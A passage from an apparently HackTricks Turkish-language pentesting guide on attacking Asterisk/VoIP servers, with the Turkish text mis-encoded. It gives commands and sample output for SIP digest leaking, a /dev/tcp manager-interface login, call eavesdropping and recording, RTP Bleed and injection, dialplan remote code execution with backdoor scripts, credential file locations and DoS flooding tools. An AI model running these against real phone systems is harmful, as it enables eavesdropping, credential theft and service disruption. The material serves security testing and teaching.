7. **SaldÄ±rgan, yerel makinesinde (veya daÄŸÄ±tÄ±lmÄ±ÅŸ aÄŸ vb.) meydan okuma yanÄ±tÄ±na brute-force saldÄ±rÄ±sÄ±** yapabilir ve ÅŸifreyi tahmin edebilir.

* [**sippts**](https://github.com/Pepelux/sippts)**'den sipdigestleak.py:** SipDigestLeak, bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± sÃ¶mÃ¼rÃ¼r.
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call, bir **web kullanÄ±cÄ±sÄ±nÄ±n** (Ã¶rneÄŸin bir Ã¼rÃ¼ne ilgi duyan bir kullanÄ±cÄ±) **arama yapÄ±lmasÄ± iÃ§in** telefon numarasÄ±nÄ± **girmesine** olanak tanÄ±r. ArdÄ±ndan bir reklam aranÄ±r ve kullanÄ±cÄ± telefonu **kaldÄ±rdÄ±ÄŸÄ±nda** kullanÄ±cÄ± **arama yapÄ±lÄ±r ve ajanla baÄŸlantÄ± kurulur**.

Bunun iÃ§in yaygÄ±n bir Asterisk profili ÅŸÃ¶yledir:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Ã–nceki profil, **HERHANGÄ° BÄ°R IP adresinin baÄŸlanmasÄ±na izin veriyor** (ÅŸifre biliniyorsa).
* Ã–nceden belirtildiÄŸi gibi, bir Ã§aÄŸrÄ± dÃ¼zenlemek iÃ§in **okuma izinleri gerekli deÄŸildir** ve **yalnÄ±zca** **yazma** iÃ§in **baÅŸlatma** gereklidir.

Bu izinlerle, ÅŸifreyi bilen herhangi bir IP adresi baÄŸlanabilir ve Ã§ok fazla bilgi Ã§Ä±karabilir, Ã¶rneÄŸin:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Daha fazla bilgi veya eylem istenebilir.**

### **Dinleme**

Asterisk'te, **`ChanSpy`** komutunu kullanarak dinlenmek istenen **dahili(leri)** (veya hepsini) belirterek gerÃ§ekleÅŸen konuÅŸmalarÄ± dinlemek mÃ¼mkÃ¼ndÃ¼r. Bu komut bir dahiliye atanmalÄ±dÄ±r.

Ã–rneÄŸin, **`exten => 333,1,ChanSpy('all',qb)`** ifadesi, **333 numaralÄ± dahiliyi** ararsanÄ±z, **`tÃ¼m`** dahilileri **dinleyeceÄŸini**, yeni bir konuÅŸma baÅŸladÄ±ÄŸÄ±nda (**`b`**) sessiz modda (**`q`**) dinlemeye baÅŸlayacaÄŸÄ±nÄ± belirtir. KonuÅŸmalardan birinden diÄŸerine geÃ§mek iÃ§in **`*`** tuÅŸuna basabilir veya dahili numarasÄ±nÄ± iÅŸaretleyebilirsiniz.

AyrÄ±ca, yalnÄ±zca bir dahiliyi dinlemek iÃ§in **`ExtenSpy`** kullanmak da mÃ¼mkÃ¼ndÃ¼r.

KonuÅŸmalarÄ± dinlemek yerine, bir dahili kullanarak bunlarÄ± **dosyalara kaydetmek** de mÃ¼mkÃ¼ndÃ¼r:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Aramalar **`/tmp`** dizininde kaydedilecektir.

AyrÄ±ca, Asterisk'i kapatÄ±ldÄ±ÄŸÄ±nda aramayÄ± sÄ±zdÄ±racak bir betik Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± bile yapabilirsiniz.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed**, 2017 yÄ±lÄ±nda yayÄ±nlanan Asterisk tabanlÄ± VoIP sunucularÄ±nÄ± etkileyen Ã¶nemli bir gÃ¼venlik sorunudur. Bu zafiyet, VoIP konuÅŸmalarÄ±nÄ± taÅŸÄ±yan **RTP (GerÃ§ek ZamanlÄ± Protokol) trafiÄŸinin**, internet Ã¼zerindeki herhangi bir kiÅŸi tarafÄ±ndan **intercept edilip yÃ¶nlendirilmesine olanak tanÄ±r**. Bu durum, RTP trafiÄŸinin NAT (AÄŸ Adresi Ã‡evirisi) gÃ¼venlik duvarlarÄ±ndan geÃ§erken kimlik doÄŸrulamasÄ±nÄ± atlamasÄ± nedeniyle meydana gelir.

NAT sistemlerini etkileyen RTC sistemlerinin sÄ±nÄ±rlamalarÄ±nÄ± ele alan RTP proxy'leri, iki veya daha fazla taraf arasÄ±nda RTP akÄ±ÅŸlarÄ±nÄ± proxy yaparak Ã§Ã¶zmeye Ã§alÄ±ÅŸÄ±r. NAT mevcut olduÄŸunda, RTP proxy yazÄ±lÄ±mÄ± genellikle sinyalizasyon (Ã¶rneÄŸin SIP) aracÄ±lÄ±ÄŸÄ±yla alÄ±nan RTP IP ve port bilgilerine gÃ¼venemez. Bu nedenle, birÃ§ok RTP proxy, bÃ¶yle bir IP ve port Ã§iftinin otomatik olarak Ã¶ÄŸrenildiÄŸi bir mekanizma uygulamÄ±ÅŸtÄ±r. Bu genellikle gelen RTP trafiÄŸini inceleyerek ve gelen RTP trafiÄŸi iÃ§in kaynak IP ve portunu yanÄ±tlanmasÄ± gereken IP ve port olarak iÅŸaretleyerek yapÄ±lÄ±r. Bu mekanizma, "Ã¶ÄŸrenme modu" olarak adlandÄ±rÄ±labilir ve **herhangi bir kimlik doÄŸrulama kullanmaz**. Bu nedenle **saldÄ±rganlar**, RTP trafiÄŸini RTP proxy'sine gÃ¶nderebilir ve meÅŸru kullanÄ±cÄ±lara gÃ¶nderilmesi gereken proxy RTP trafiÄŸini alabilir. Bu zafiyete RTP Bleed adÄ±nÄ± veriyoruz Ã§Ã¼nkÃ¼ saldÄ±rganlara meÅŸru kullanÄ±cÄ±lara gÃ¶nderilmesi gereken RTP medya akÄ±ÅŸlarÄ±nÄ± almasÄ±na olanak tanÄ±r.

RTP proxy'lerinin ve RTP yÄ±ÄŸÄ±nlarÄ±nÄ±n baÅŸka bir ilginÃ§ davranÄ±ÅŸÄ± ise, **RTP Bleed'e karÅŸÄ± savunmasÄ±z olsalar bile**, bazen **herhangi bir kaynaktan gelen RTP paketlerini kabul eder, iletebilir ve/veya iÅŸleyebilirler**. Bu nedenle saldÄ±rganlar, meÅŸru olanÄ±n yerine kendi medyalarÄ±nÄ± enjekte etmelerine izin verebilecek RTP paketleri gÃ¶nderebilirler. Bu saldÄ±rÄ±ya RTP enjeksiyonu adÄ±nÄ± veriyoruz Ã§Ã¼nkÃ¼ mevcut RTP akÄ±ÅŸlarÄ±na meÅŸru olmayan RTP paketlerinin enjekte edilmesine olanak tanÄ±r. Bu zafiyet hem RTP proxy'lerinde hem de uÃ§ noktalarda bulunabilir.

Asterisk ve FreePBX, geleneksel olarak RTP trafiÄŸinin kimlik doÄŸrulamasÄ±nÄ± atlamasÄ±na neden olan **`NAT=yes` ayarÄ±nÄ±** kullanmÄ±ÅŸtÄ±r, bu da Ã§aÄŸrÄ±larda ses olmamasÄ±na veya tek yÃ¶nlÃ¼ ses olmasÄ±na neden olabilir.

Daha fazla bilgi iÃ§in [https://www.rtpbleed.com/](https://www.rtpbleed.com/) adresini kontrol edin.

* [**sippts**](https://github.com/Pepelux/sippts) 'den **`rtpbleed.py`**:** RTP Bleed zafiyetini tespit ederek RTP akÄ±ÅŸlarÄ± gÃ¶nderir.
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`** [**sippts**](https://github.com/Pepelux/sippts) tarafÄ±ndan: RTP akÄ±ÅŸlarÄ± gÃ¶ndererek RTP Bleed zafiyetini tespit eder.
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`** [**sippts**](https://github.com/Pepelux/sippts) tarafÄ±ndan: RTP Bleed zafiyetini sÃ¶mÃ¼rerek RTP akÄ±ÅŸlarÄ± gÃ¶nderir.
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`** [**sippts**](https://github.com/Pepelux/sippts) dosyasÄ±ndan: RTP Bleed aÃ§Ä±ÄŸÄ±ndan yararlanarak RTP akÄ±ÅŸlarÄ± gÃ¶nderir (bir ses dosyasÄ±ndan)
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)

Asterisk'te, bir ÅŸekilde **dahili numara kurallarÄ± ekleyip yeniden yÃ¼klemeyi** baÅŸarabilirsiniz (Ã¶rneÄŸin, zafiyetli bir web yÃ¶netici sunucusunu ele geÃ§irerek). **`System`** komutunu kullanarak RCE elde etmek mÃ¼mkÃ¼ndÃ¼r.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
**`Shell`** adÄ±nda bir komut vardÄ±r, gerektiÄŸinde sistem komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in **`System`** yerine kullanÄ±labilir.

{% hint style="warning" %}
Sunucu, **`System`** komutunda belirli karakterlerin kullanÄ±mÄ±nÄ± **yasaklÄ±yorsa** (Ã¶rneÄŸin Elastix'te), web sunucusunun **sistem iÃ§inde dosya oluÅŸturmaya izin verip vermediÄŸini** kontrol edin (Ã¶rneÄŸin Elastix veya trixbox'ta) ve bunu kullanarak bir **arka kapÄ± betiÄŸi oluÅŸturun** ve ardÄ±ndan **`System`** kullanarak o **betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±n**.
{% endhint %}

#### Ä°lginÃ§ yerel dosyalar ve izinler

* **`sip.conf`** -> SIP kullanÄ±cÄ±larÄ±nÄ±n ÅŸifresini iÃ§erir.
* **Asterisk sunucusu root olarak Ã§alÄ±ÅŸÄ±yorsa**, root hesabÄ±nÄ± ele geÃ§irebilirsiniz.
* **mysql root kullanÄ±cÄ±sÄ±nÄ±n** herhangi bir ÅŸifresi olmayabilir.
* Bu, yeni bir mysql kullanÄ±cÄ±sÄ± oluÅŸturmak iÃ§in kullanÄ±labilir.
* **`FreePBX`**
* **`amportal.conf`** -> Web panel yÃ¶neticisinin (FreePBX) ÅŸifresini iÃ§erir.
* **`FreePBX.conf`** -> VeritabanÄ±na eriÅŸmek iÃ§in kullanÄ±lan FreePBXuser kullanÄ±cÄ±sÄ±nÄ±n ÅŸifresini iÃ§erir.
* Bu, yeni bir mysql kullanÄ±cÄ±sÄ± oluÅŸturmak iÃ§in kullanÄ±labilir.
* **`Elastix`**
* **`Elastix.conf`** -> Mysql root ÅŸifresi, IMAPd ÅŸifresi, web yÃ¶netici ÅŸifresi gibi birkaÃ§ ÅŸifreyi aÃ§Ä±k metin olarak iÃ§erir.
* **BirÃ§ok klasÃ¶r**, ele geÃ§irilen asterisk kullanÄ±cÄ±sÄ±na ait olacaktÄ±r (root olarak Ã§alÄ±ÅŸmÄ±yorsa). Bu kullanÄ±cÄ± Ã¶nceki dosyalarÄ± okuyabilir ve ayrÄ±ca yapÄ±landÄ±rmayÄ± kontrol eder, bu nedenle Asterisk'in baÅŸka bir arka kapÄ±lÄ± ikili dosyayÄ± Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± saÄŸlayabilir.

### RTP Enjeksiyonu

**`rtpinsertsound`** (`sudo apt install rtpinsertsound`) ve **`rtpmixsound`** (`sudo apt install rtpmixsound`) gibi araÃ§lar kullanarak konuÅŸmalara **`.wav`** eklemek mÃ¼mkÃ¼ndÃ¼r.

Veya [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) adresindeki betikleri kullanarak konuÅŸmalarÄ± **taramak** iÃ§in (**`rtpscan.pl`**), bir `.wav`'Ä± bir konuÅŸmaya gÃ¶ndermek iÃ§in (**`rtpsend.pl`**) ve bir konuÅŸmaya gÃ¼rÃ¼ltÃ¼ eklemek iÃ§in (**`rtpflood.pl`**) kullanabilirsiniz.

### DoS

VoIP sunucularÄ±nda DoS elde etmek iÃ§in birkaÃ§ yol vardÄ±r.

* [**sippts**](https://github.com/Pepelux/sippts) Ã¼zerindeki **`sipflood.py`**: **_**SipFlood**_ hedefe sÄ±nÄ±rsÄ±z mesaj gÃ¶nderir.
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Asterisk tarafÄ±ndan kullanÄ±lan IAX protokolÃ¼ne DoS saldÄ±rÄ±sÄ± yapar.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): UDP/IP Ã¼zerinden SIP/SDP INVITE mesajÄ± sÄ±zdÄ±rma yapmak iÃ§in bir araÃ§.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): BirkaÃ§ dÃ¼zgÃ¼n oluÅŸturulmuÅŸ RTP paketi gÃ¶nderir. KullanÄ±lan RTP baÄŸlantÄ± noktalarÄ±nÄ± bilmek gereklidir (Ã¶nce izlemek).
* [**SIPp**](https://github.com/SIPp/sipp): SIP trafiÄŸini analiz etmeye ve oluÅŸturmaya olanak saÄŸlar, bu nedenle DoS iÃ§in de kullanÄ±labilir.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP Ä°sviÃ§re Ã§akÄ±sÄ±. SIP saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in de kullanÄ±labilir.
* Fuzzer'lar: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).
* [**sippts**](https://github.com/Pepelux/sippts) Ã¼zerindeki **`sipsend.py`**: SIPSend, Ã¶zelleÅŸtirilmiÅŸ bir SIP mesajÄ± gÃ¶ndermemize ve yanÄ±tÄ± analiz etmemize olanak saÄŸlar.
* [**sippts**](https://github.com/Pepelux/sippts) Ã¼zerindeki **`wssend.py`**: WsSend, WebSockets Ã¼zerinden Ã¶zelleÅŸtirilmiÅŸ bir SIP mesajÄ± gÃ¶ndermemize ve yanÄ±tÄ± analiz etmemize olanak saÄŸlar.

### Ä°ÅŸletim Sistemi Zafiyetleri

Asterisk gibi bir yazÄ±lÄ±mÄ± kurmanÄ±n en kolay yolu, zaten yÃ¼klÃ¼ olan bir **iÅŸletim sistemi daÄŸÄ±tÄ±mÄ±nÄ±** indirmektir, Ã¶rneÄŸin: **FreePBX, Elastix, Trixbox**... Ancak, bu tÃ¼r sistemler Ã§alÄ±ÅŸtÄ±ktan sonra sistem yÃ¶neticileri genellikle bunlarÄ± **gÃ¼ncellemezler** ve zamanla **zafiyetler** keÅŸfedilir.

## Referanslar

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin.
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
